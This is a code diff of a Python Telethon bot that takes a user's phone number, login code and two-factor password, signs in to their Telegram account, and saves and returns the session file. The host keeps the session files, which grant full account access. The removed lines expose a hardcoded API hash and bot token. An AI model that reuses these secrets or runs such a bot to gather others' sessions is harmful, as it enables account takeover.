@@ -1,16 +1,64 @@
 import os
 import asyncio
+import sys
 from telethon import TelegramClient, events
 from telethon.tl.types import Message
 from telethon.errors import SessionPasswordNeededError
 
-API_ID = 34855392  # عدد API ID خود را وارد کنید
-API_HASH = "5e40d435847009c31c24042e2a3c0d3b"  # API Hash خود را وارد کنید
-BOT_TOKEN = "8692323102:AAHVQ5sxZjQk81D8YN5QNItQXMt25vurXqQ"  # توکن ربات خود را اینجا وارد کنید
+# ==================== تنظیمات اولیه ====================
+API_ID = int(os.environ.get("API_ID", 0))
+API_HASH = os.environ.get("API_HASH", "")
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
+
+# بررسی وجود توکن
+if not BOT_TOKEN or not API_ID or not API_HASH:
+    print("❌ ERROR: Missing environment variables!")
+    print("Please set API_ID, API_HASH, and BOT_TOKEN")
+    sys.exit(1)
 
 # دیکشنری برای ذخیره وضعیت کاربران
 user_sessions = {}
 
+# ==================== بخش HTTP Server ====================
+try:
+    from aiohttp import web
+    import socket
+    
+    async def health_check(request):
+        """Endpoint ساده برای بررسی سلامت ربات"""
+        return web.Response(text="✅ Bot is running!", status=200)
+    
+    async def run_web_server():
+        """اجرای web server روی پورت مشخص شده"""
+        port = int(os.environ.get("PORT", 8080))
+        
+        app = web.Application()
+        app.router.add_get('/', health_check)
+        app.router.add_get('/health', health_check)
+        
+        runner = web.AppRunner(app)
+        await runner.setup()
+        
+        site = web.TCPSite(runner, '0.0.0.0', port)
+        await site.start()
+        
+        print(f"🌐 Web server running on port {port}")
+        
+        # نگه داشتن سرور تا زمانی که ربات فعال است
+        while True:
+            await asyncio.sleep(3600)  # sleep برای 1 ساعت
+    
+except ImportError:
+    print("⚠️ aiohttp not installed. Web server disabled.")
+    
+    async def run_web_server():
+        """اگر aiohttp نصب نیست، یک تابع دامی اجرا کن"""
+        port = int(os.environ.get("PORT", 8080))
+        print(f"⚠️ Web server not available, but port {port} is configured.")
+        while True:
+            await asyncio.sleep(3600)
+
+# ==================== کلاس اصلی ربات ====================
 class SessionBot:
     def __init__(self):
         self.bot = TelegramClient(
@@ -26,8 +74,13 @@ class SessionBot:
         self.temp_clients = {}
 
     async def start(self):
+        # شروع ربات با توکن
         await self.bot.start(bot_token=BOT_TOKEN)
-        print("ربات راه‌اندازی شد!")
+        print("🤖 ربات راه‌اندازی شد!")
+        
+        # نمایش اطلاعات ربات
+        me = await self.bot.get_me()
+        print(f"✅ ربات با نام @{me.username} آماده است!")
 
         @self.bot.on(events.NewMessage(pattern='/start'))
         async def start_command(event):
@@ -54,8 +107,8 @@ class SessionBot:
                 'step': 'phone',
                 'code': '',
                 'phone': None,
-                'code_length': 5,  # طول پیش‌فرض کد
-                'message_id': None  # برای مدیریت پیام‌ها
+                'code_length': 5,
+                'message_id': None
             }
             
             await event.respond(
@@ -85,23 +138,17 @@ class SessionBot:
                         
                         if not await client.is_user_authorized():
                             try:
-                                # ارسال درخواست کد
                                 await client.send_code_request(phone)
                                 user_data['phone'] = phone
                                 user_data['step'] = 'code'
                                 user_data['code'] = ''
                                 
-                                # نمایش پنل کد
                                 await self.show_code_panel(event, user_data)
                                 
                             except Exception as e:
                                 await event.respond(f"❌ خطا: {str(e)}")
                         else:
                             await event.respond("⚠️ این شماره قبلاً تأیید شده است!")
-                    
-                    elif step == 'code' or step == '2fa':
-                        # پردازش callback های پنل کد
-                        pass
                 
                 except Exception as e:
                     await event.respond(f"❌ خطای غیرمنتظره: {str(e)}")
@@ -120,6 +167,7 @@ class SessionBot:
             if user_data['step'] == 'code' or user_data['step'] == '2fa':
                 await self.handle_code_input(event, user_data, data)
 
+        # اجرای ربات تا زمان قطع شدن
         await self.bot.run_until_disconnected()
 
     async def show_code_panel(self, event, user_data):
@@ -127,9 +175,8 @@ class SessionBot:
         step = user_data['step']
         code = user_data['code']
         
-        # تعیین طول کد بر اساس مرحله
         if step == '2fa':
-            code_length = 0  # طول نامحدود برای رمز 2FA
+            code_length = 0
             title = "🔐 رمز عبور دو مرحله‌ای را وارد کنید:"
             placeholder = "••••••••"
         else:
@@ -137,16 +184,13 @@ class SessionBot:
             title = "📝 کد تأیید را وارد کنید:"
             placeholder = "_" * code_length
         
-        # ساخت نمایش کد با جای خالی
         if step == '2fa':
             display_code = "•" * len(code) if code else placeholder
         else:
             display_code = code if code else placeholder
-            # پر کردن جای خالی
             if len(code) < code_length:
                 display_code = code + "_" * (code_length - len(code))
         
-        # ساخت دکمه‌های عددی
         buttons = []
         
         # دکمه‌های 1-9
@@ -157,14 +201,13 @@ class SessionBot:
                 buttons.append(row)
                 row = []
         
-        # ردیف آخر: پاک کردن، 0، تأیید
+        # ردیف آخر
         buttons.append([
             ("🗑️ پاک کردن", "code_clear"),
             ("0", "code_0"),
             ("✅ تأیید", "code_submit")
         ])
         
-        # ساخت کیبورد
         keyboard = []
         for row in buttons:
             keyboard.append([{
@@ -172,13 +215,11 @@ class SessionBot:
                 'callback_data': callback_data
             } for text, callback_data in row])
         
-        # متن پیام
         if step == '2fa':
             message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن رمز استفاده کنید:"
         else:
             message_text = f"{title}\n\n`{display_code}`\n\nاز صفحه‌کلید زیر برای وارد کردن کد استفاده کنید:"
         
-        # ویرایش یا ارسال پیام جدید
         if user_data.get('message_id'):
             try:
                 await self.bot.edit_message(
@@ -189,7 +230,6 @@ class SessionBot:
                     buttons=keyboard
                 )
             except:
-                # اگر پیام قبلی وجود نداشت، پیام جدید بفرست
                 msg = await event.respond(
                     message_text,
                     parse_mode='markdown',
@@ -216,14 +256,12 @@ class SessionBot:
             action = data.split('_')[1]
             
             if action == 'clear':
-                # پاک کردن آخرین رقم
                 if code:
                     user_data['code'] = code[:-1]
                 await self.show_code_panel(event, user_data)
                 await event.answer()
                 
             elif action == 'submit':
-                # تأیید کد
                 if step == '2fa':
                     if len(code) < 1:
                         await event.answer("❗ لطفاً رمز عبور را وارد کنید.", alert=True)
@@ -236,9 +274,7 @@ class SessionBot:
                     await self.verify_code(event, user_data)
                 
             elif action.isdigit():
-                # اضافه کردن رقم
                 if step == '2fa':
-                    # برای 2FA محدودیت طول نداریم
                     user_data['code'] = code + action
                 else:
                     if len(code) < code_length:
@@ -258,28 +294,23 @@ class SessionBot:
         try:
             await client.sign_in(phone, code)
             
-            # موفقیت
             await event.answer("✅ تأیید کد با موفقیت انجام شد!", alert=True)
             
-            # ارسال فایل سشن
             session_file = user_data['session_path'] + ".session"
             
             if os.path.isfile(session_file):
-                # ارسال به Saved Messages
                 await client.send_file(
                     "me",
                     session_file,
                     caption=f"📁 فایل سشن: {user_data['session_name']}"
                 )
                 
-                # ارسال به ربات
                 await self.bot.send_file(
                     event.chat_id,
                     session_file,
                     caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                 )
                 
-                # پاک کردن پیام پنل
                 if user_data.get('message_id'):
                     try:
                         await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
@@ -288,13 +319,11 @@ class SessionBot:
                 
                 await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                 
-                # پاک کردن داده‌های موقت
                 del self.temp_clients[event.sender_id]
             else:
                 await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
                 
         except SessionPasswordNeededError:
-            # نیاز به رمز 2FA
             user_data['step'] = '2fa'
             user_data['code'] = ''
             await event.answer("🔐 نیاز به رمز عبور دو مرحله‌ای!", alert=True)
@@ -320,28 +349,23 @@ class SessionBot:
         try:
             await client.sign_in(password=password)
             
-            # موفقیت
             await event.answer("✅ تأیید رمز با موفقیت انجام شد!", alert=True)
             
-            # ارسال فایل سشن
             session_file = user_data['session_path'] + ".session"
             
             if os.path.isfile(session_file):
-                # ارسال به Saved Messages
                 await client.send_file(
                     "me",
                     session_file,
                     caption=f"📁 فایل سشن: {user_data['session_name']}"
                 )
                 
-                # ارسال به ربات
                 await self.bot.send_file(
                     event.chat_id,
                     session_file,
                     caption="✅ ورود موفقیت‌آمیز بود!\n\n📁 فایل سشن شما:"
                 )
                 
-                # پاک کردن پیام پنل
                 if user_data.get('message_id'):
                     try:
                         await self.bot.delete_messages(event.chat_id, [user_data['message_id']])
@@ -350,7 +374,6 @@ class SessionBot:
                 
                 await event.respond("✅ عملیات با موفقیت انجام شد!\nفایل سشن به Saved Messages و اینجا ارسال شد.")
                 
-                # پاک کردن داده‌های موقت
                 del self.temp_clients[event.sender_id]
             else:
                 await event.respond("❌ خطا: فایل سشن ایجاد نشد!")
@@ -364,10 +387,43 @@ class SessionBot:
             else:
                 await event.answer(f"❌ خطا: {error_msg}", alert=True)
 
+# ==================== اجرای اصلی ====================
 async def main():
+    # ایجاد پوشه سشن‌ها
+    os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
+    
+    # ایجاد نمونه ربات
     bot = SessionBot()
-    await bot.start()
+    
+    # اجرای همزمان ربات و سرور وب
+    try:
+        # شروع ربات
+        bot_task = asyncio.create_task(bot.start())
+        
+        # شروع سرور وب
+        web_task = asyncio.create_task(run_web_server())
+        
+        # منتظر ماندن تا اولین تسک تمام شود (معمولاً هیچکدام تمام نمی‌شوند)
+        done, pending = await asyncio.wait(
+            [bot_task, web_task],
+            return_when=asyncio.FIRST_COMPLETED
+        )
+        
+        # اگر یکی از تسک‌ها تمام شد، بقیه را لغو کن
+        for task in pending:
+            task.cancel()
+            
+    except KeyboardInterrupt:
+        print("\n🛑 ربات متوقف شد.")
+    except Exception as e:
+        print(f"❌ خطا: {e}")
+        sys.exit(1)
 
 if __name__ == "__main__":
-    os.makedirs(os.path.expanduser("~/sessions"), exist_ok=True)
-    asyncio.run(main())
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n🛑 برنامه با Ctrl+C متوقف شد.")
+    except Exception as e:
+        print(f"❌ خطای اجرا: {e}")
+        sys.exit(1)
